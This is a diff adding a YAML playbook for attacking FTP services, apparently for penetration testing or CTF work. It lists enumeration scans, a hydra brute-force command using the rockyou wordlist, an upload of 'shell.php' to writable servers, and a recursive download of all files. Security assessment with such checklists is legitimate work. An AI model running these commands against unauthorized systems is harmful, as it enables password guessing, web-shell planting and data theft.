@@ -1,0 +1,30 @@
+service: ftp
+ports: [21]
+categories:
+  enumeration:
+    - id: ftp_banner
+      description: "Grab FTP banner"
+      command: "nmap -sV -p 21 {IP}"
+      priority: high
+    - id: ftp_anon
+      description: "Test anonymous login"
+      command: "ftp {IP} # user: anonymous, pass: (blank)"
+      priority: high
+    - id: ftp_nmap_scripts
+      description: "Run FTP nmap scripts"
+      command: "nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 {IP}"
+      priority: high
+  exploitation:
+    - id: ftp_brute
+      description: "Brute force FTP"
+      command: "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ftp://{IP}"
+      priority: medium
+    - id: ftp_upload
+      description: "Upload file (if writable)"
+      command: "put shell.php"
+      priority: medium
+  post_exploitation:
+    - id: ftp_download_all
+      description: "Download all files recursively"
+      command: "wget -r ftp://anonymous@{IP}/"
+      priority: medium
